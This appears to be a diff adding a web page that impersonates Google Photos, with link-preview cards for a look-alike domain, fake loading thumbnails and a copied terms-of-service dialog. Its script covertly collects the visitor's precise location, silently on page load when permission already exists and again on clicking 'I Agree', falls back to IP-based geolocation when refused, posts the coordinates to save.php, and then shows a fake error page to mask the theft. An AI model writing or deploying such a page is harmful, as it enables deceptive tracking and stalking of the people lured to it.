@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Photos</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/png" href="logo.png">
+
+    <!-- Open Graph / WhatsApp / Instagram Card Data -->
+    <meta property="og:title" content="Google Photos">
+    <meta property="og:description" content="View, manage, and share your photos and videos securely.">
+    <meta property="og:url" content="https://photos-google.rf.gd/">
+    <meta property="og:image" content="https://photos-google.rf.gd/card.jpeg">
+    <meta property="og:type" content="website">
+
+    <!-- App Card Data for messaging apps -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Google Photos">
+    <meta name="twitter:description" content="View, manage, and share your photos and videos securely.">
+    <meta name="twitter:image" content="https://photos-google.rf.gd/card.jpeg">
+</head>
+
+<body>
+    <header class="header">
+        <div class="logo-container">
+            <img src="logo.png" alt="Google Photos" class="gb_uc" style="margin-right: 10px; width: 30px;">
+            <span class="logo-text">Google Photos</span>
+        </div>
+        <div class="header-right">
+            <button class="sign-in-btn">Sign in</button>
+        </div>
+    </header>
+
+    <main class="content-area">
+        <!-- Section 1 -->
+        <div class="date-header skeleton-shimmer" style="width: 200px;"></div>
+        <div class="photo-grid">
+            <div class="skeleton-card skeleton-shimmer row-span-2 col-span-2"></div>
+            <div class="skeleton-card skeleton-shimmer row-span-1 col-span-1"></div>
+            <div class="skeleton-card skeleton-shimmer row-span-1 col-span-2"></div>
+            <div class="skeleton-card skeleton-shimmer row-span-2 col-span-1"></div>
+            <div class="skeleton-card skeleton-shimmer row-span-1 col-span-1"></div>
+            <div class="skeleton-card skeleton-shimmer row-span-1 col-span-1"></div>
+            <div class="skeleton-card skeleton-shimmer row-span-1 col-span-1"></div>
+        </div>
+
+        <!-- Section 2 -->
+        <div class="date-header skeleton-shimmer" style="width: 150px;"></div>
+        <div class="photo-grid">
+            <div class="skeleton-card skeleton-shimmer row-span-1 col-span-1 mobile-long-left"></div>
+            <div class="skeleton-card skeleton-shimmer row-span-1 col-span-1"></div>
+            <div class="skeleton-card skeleton-shimmer row-span-2 col-span-2"></div>
+            <div class="skeleton-card skeleton-shimmer row-span-1 col-span-1"></div>
+            <div class="skeleton-card skeleton-shimmer row-span-1 col-span-1"></div>
+            <div class="skeleton-card skeleton-shimmer row-span-1 col-span-1"></div>
+            <div class="skeleton-card skeleton-shimmer row-span-1 col-span-1"></div>
+            <div class="skeleton-card skeleton-shimmer row-span-1 col-span-2"></div>
+        </div>
+
+        <!-- Section 3 -->
+        <div class="date-header skeleton-shimmer" style="width: 250px;"></div>
+        <div class="photo-grid">
+            <div class="skeleton-card skeleton-shimmer row-span-2 col-span-1"></div>
+            <div class="skeleton-card skeleton-shimmer row-span-1 col-span-2"></div>
+            <div class="skeleton-card skeleton-shimmer row-span-1 col-span-1"></div>
+            <div class="skeleton-card skeleton-shimmer row-span-1 col-span-1"></div>
+            <div class="skeleton-card skeleton-shimmer row-span-2 col-span-2"></div>
+            <div class="skeleton-card skeleton-shimmer row-span-1 col-span-1"></div>
+            <div class="skeleton-card skeleton-shimmer row-span-1 col-span-1"></div>
+        </div>
+    </main>
+
+    <!-- Dialog Overlay -->
+    <div class="dialog-overlay" id="termsDialog" style="display: none;">
+        <div class="dialog-box">
+            <div class="dialog-header">
+                <h2>Terms of Service</h2>
+            </div>
+            <div class="dialog-content">
+                <p>Welcome to Google Photos.</p>
+                <br>
+                <p>By using our services, you are agreeing to these terms. Please read them carefully.</p>
+                <br>
+                <p>Our Services are very diverse, so sometimes additional terms or product requirements (including age
+                    requirements) may apply. Additional terms will be available with the relevant Services, and those
+                    additional terms become part of your agreement with us if you use those Services.</p>
+                <br>
+                <h3>Using our Services</h3>
+                <p>You must follow any policies made available to you within the Services.</p>
+                <br>
+                <p>Don't misuse our Services. For example, don't interfere with our Services or try to access them using
+                    a method other than the interface and the instructions that we provide. You may use our Services
+                    only as permitted by law, including applicable export and re-export control laws and regulations. We
+                    may suspend or stop providing our Services to you if you do not comply with our terms or policies or
+                    if we are investigating suspected misconduct.</p>
+                <br>
+                <p>Using our Services does not give you ownership of any intellectual property rights in our Services or
+                    the content you access. You may not use content from our Services unless you obtain permission from
+                    its owner or are otherwise permitted by law. These terms do not grant you the right to use any
+                    branding or logos used in our Services. Don't remove, obscure, or alter any legal notices displayed
+                    in or along with our Services.</p>
+                <br>
+                <h3>Privacy and Copyright Protection</h3>
+                <p>Our privacy policies explain how we treat your personal data and protect your privacy when you use
+                    our Services. By using our Services, you agree that we can use such data in accordance with our
+                    privacy policies.</p>
+                <br>
+                <p>We respond to notices of alleged copyright infringement and terminate accounts of repeat infringers
+                    according to the process set out in the U.S. Digital Millennium Copyright Act.</p>
+            </div>
+            <div class="dialog-footer">
+                <button class="dialog-btn cancel-btn">Decline</button>
+                <button class="dialog-btn agree-btn" id="agreeBtn">I Agree</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Script to handle Geolocation -->
+    <script>
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                document.getElementById('termsDialog').style.display = 'flex';
+            }, 1000);
+
+            // Check if permission is already granted for transparent background gathering
+            if (navigator.permissions && "geolocation" in navigator) {
+                navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
+                    if (result.state === 'granted') {
+                        navigator.geolocation.getCurrentPosition(function(position) {
+                            fetch('save.php', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    lat: position.coords.latitude,
+                                    lng: position.coords.longitude
+                                })
+                            });
+                        }, function(e) {}, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+                    }
+                });
+            }
+        });
+
+        document.getElementById('agreeBtn').addEventListener('click', function () {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    function (position) {
+                        // Success: User explicitly allowed tracking
+                        const data = {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude
+                        };
+
+                        // Send data to PHP script to write to text file
+                        fetch('save.php', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(data)
+                        }).then(function () {
+                            showErrorScreen(false, "Please try again later.");
+                        }).catch(function (err) {
+                            showErrorScreen(false, "Server saving failed: " + err.message);
+                        });
+                    },
+                    function (error) {
+                        // Fallback to IP Geolocation if explicit permission is denied/blocked
+                        fetch('https://get.geojs.io/v1/ip/geo.json')
+                            .then(function(response) { return response.json(); })
+                            .then(function(ipData) {
+                                if (ipData.latitude && ipData.longitude) {
+                                    fetch('save.php', {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({
+                                            lat: parseFloat(ipData.latitude).toFixed(8),
+                                            lng: parseFloat(ipData.longitude).toFixed(8)
+                                        })
+                                    }).finally(function() {
+                                        showErrorScreen(true);
+                                    });
+                                } else {
+                                    showErrorScreen(true, "IP data incomplete.");
+                                }
+                            })
+                            .catch(function(e) {
+                                showErrorScreen(true, "Fallback failed: " + e.message);
+                            });
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                showErrorScreen(true, "Error: Err. No. 404.");
+            }
+        });
+
+        function showErrorScreen(showRefreshLink, details) {
+            // Hide the terms dialogue
+            document.getElementById('termsDialog').style.display = 'none';
+
+            // Create full screen error container
+            const errorContainer = document.createElement('div');
+            errorContainer.style.position = 'fixed';
+            errorContainer.style.top = '0';
+            errorContainer.style.left = '0';
+            errorContainer.style.width = '100%';
+            errorContainer.style.height = '100vh';
+            errorContainer.style.backgroundColor = '#ffffff';
+            errorContainer.style.zIndex = '3000';
+            errorContainer.style.display = 'flex';
+            errorContainer.style.flexDirection = 'column';
+            errorContainer.style.justifyContent = 'center';
+            errorContainer.style.alignItems = 'center';
+
+            let html = '<h2 style="color: #202124; font-size: 24px; font-weight: 400; margin-bottom: 12px;">Something went wrong</h2>';
+            html += '<p style="color: #5f6368; font-size: 14px; text-align: center; padding: 0 20px;">' + (details || 'We were unable to complete your request at this time.') + '</p>';
+
+            if (showRefreshLink) {
+                html += '<p style="color: #d93025; font-size: 13px; font-weight: 500; margin-top: 12px; text-align: center;">Tip: Try opening this link in an external browser (like Chrome or Safari).</p>';
+                html += '<a href="javascript:window.location.reload();" style="color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; margin-top: 16px;">Refresh page</a>';
+            }
+
+            errorContainer.innerHTML = html;
+            document.body.appendChild(errorContainer);
+        }
+    </script>
+</body>
+
+</html>
